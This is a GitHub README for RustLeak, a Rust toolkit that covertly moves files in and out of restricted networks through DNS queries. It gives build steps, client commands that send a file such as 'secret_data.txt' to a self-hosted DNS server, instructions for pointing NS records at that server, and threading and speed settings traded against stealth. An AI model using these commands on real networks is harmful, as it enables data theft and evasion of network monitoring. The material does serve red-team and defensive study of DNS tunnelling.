# **RustLeak**

**RustLeak** is a DNS-based data exfiltration and infiltration toolkit, built with Rust. It can be used in a restricted environment. It aims in the future to be more stealth. It consists of two main components:

- **`rustleak-server`**: The custom DNS server that processes data through DNS queries.
- **`rustleak-client`**: The client tool to send or receive data using the server.

---

## **Important Notice**
- You need to set up and host the DNS Server.
- Update your DNS provider settings to redirect DNS traffic to your server.
  

---

## **Features**
- **Custom DNS Server**: Handles DNS zones and processes encoded data.
- **Exfiltration and Infiltration**: Transmit or receive data using DNS queries and responses.
- **Command-Line Interface (CLI)**: Simple commands for sending and receiving data.

---

## **How It Works**
- **Exfiltration**: The client (`rustleak-client`) sends data embedded in DNS queries to the server (`rustleak-server`), which decodes and stores it.
- **Infiltration**: The server responds with data embedded in DNS responses, and the client decodes the received data.

---

## **Possible Upgrades**
- [x] **Record Type Rotation**: Upload request types vary between TXT, A, AAAA, and CNAME.
- [x] **Multi-threading**: Allow the use of multi-threading to increase speed (at the cost of stealth).
- [x] **Speed parameter**: Allow more control over the delay between request ( like nmap) 
- [ ] **Symmetric Encryption**: Encrypt data by providing a code for encryption when starting the program.
- [ ] **Asymmetric Encryption**: Encrypt data automatically without requiring a code for encryption.
- [ ] **Upload Speed Upgrade**: Transfer more labels in upload queries.
- [ ] **Download Speed Upgrade**: Transfer more data per download query.

---
## **Speeds**

### **Version v0.1.0**
| Threads | Speed    | Upload Bandwidth | Download Bandwidth |
|---------|----------|------------------|--------------------|
| 4       | Default  | ~250 Bytes/s     | ~230 Bytes/s       |

---

### **Version v0.1.1**
The speed depends on the combination of the number of threads (`-t`) and the speed parameter (`--speed`). Below are the performance benchmarks:

#### **Low Speed (`t0`)**
| Threads | Upload Bandwidth | Download Bandwidth |
|---------|------------------|--------------------|
| 1       | 50 Bytes/s       | 50 Bytes/s         |
| 10      | 500 Bytes/s      | 400 Bytes/s        |

#### **High Speed (`t5`)**
| Threads | Upload Bandwidth | Download Bandwidth |
|---------|------------------|--------------------|
| 1       | 500 Bytes/s      | 500 Bytes/s        |
| 10      | 4.7 KB/s         | 3.2 KB/s           |

---

### **Notes**
1. **Speed Parameter (`--speed`)**:
   - `t0`: Super slow (maximum stealth).
   - `t5`: Super fast (minimum stealth).

2. **Threads (`-t`)**:
   - Increasing the number of threads can significantly improve performance, but may reduce stealth.

3. The bandwidth values are approximate and may vary depending on the network environment and server setup.

---

## **Installation**

### Prerequisites
- Rust (latest stable version)
- Cargo (Rust package manager)

### Clone the Repository
```bash
git clone https://github.com/Natounet/RustLeak.git
cd RustLeak
```

### Build the Tools
```bash
cargo build --release
```

---


## **Usage**

### **Client: \`rustleak-client\`**
The client provides commands to send or receive data via DNS queries. Below are the supported commands:
- ` send | receive ` : The command to be executed
- `--code`: A unique identifier for the data being sent.
- `--filename`: Path to the file containing the data to be sent.
- `--domain`: The domain name managed by the DNS server.
- `[-t nb]`: Optionally specify the number of threads to use.
- `[-s nb]`: Optinally specify the speed ( T0 slowest to T5 the fastest ) allowing to range between speed/stealth.

#### **Send Data**
Use the \`Send\` command to exfiltrate data:
```bash
rustleak-client send --code <unique_code> --filename <file_to_send> --domain <dns_server_domain> [-t nb]  [-s nb] 
```

**Example**:
```bash
rustleak-client send --code test123 --filename secret_data.txt --domain example.com
```

![upload](https://github.com/user-attachments/assets/cb1cfe8d-8ff6-4c0f-a24a-2f25a153ece6)



#### **Receive Data**
Use the `Receive` command to retrieve data:
```bash
rustleak-client receive --code <unique_code> --filename <output_file> --domain <dns_server_domain> [-t nb]  [-s nb] 
```

**Example**:
```bash
rustleak-client receive --code test123 --filename received_data.txt --domain example.com
```

![download](https://github.com/user-attachments/assets/bd13898f-bcdc-4ddf-8241-50bf65275ed4)


---

### **Server: \`rustleak-server\`**
The server handles DNS queries for a specific domain.

#### **Start the Server**
Run the server and specify the DNS zone to manage:
```bash
rustleak-server --domain <dns_zone> 
```

**Options**:
- `--domain`: The DNS zone to manage (e.g., \`example.com\`).
- `--port`: The port for the DNS server (default: 53).
- `--output`: File to save data received from clients.

**Example**:
```bash
rustleak-server --domain example.com 
```

---

## **Deployment**

To deploy `rustleak-server` online:
1. Obtain a domain name (e.g., \`example.com\`) and configure its DNS records.
2. Point your domain's **NS record** to the public IP of the machine running \`rustleak-server\`.
3. Start the server with the appropriate domain.

**DNS Configuration Example**:
```plaintext
example.com.    IN NS   <server-public-ip>
```
---

## **License**
This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

## **Contributing**
Contributions are welcome! Feel free to submit issues or pull requests for bug fixes or new features.

---

## **Disclaimer**
This tool is intended for **educational purposes** and authorized security testing only. The developer is not responsible for any misuse of this tool.

---

## **Contact**
For any questions or feedback, please open an issue on the [GitHub repository](https://github.com/Natounet/RustLeak).

---
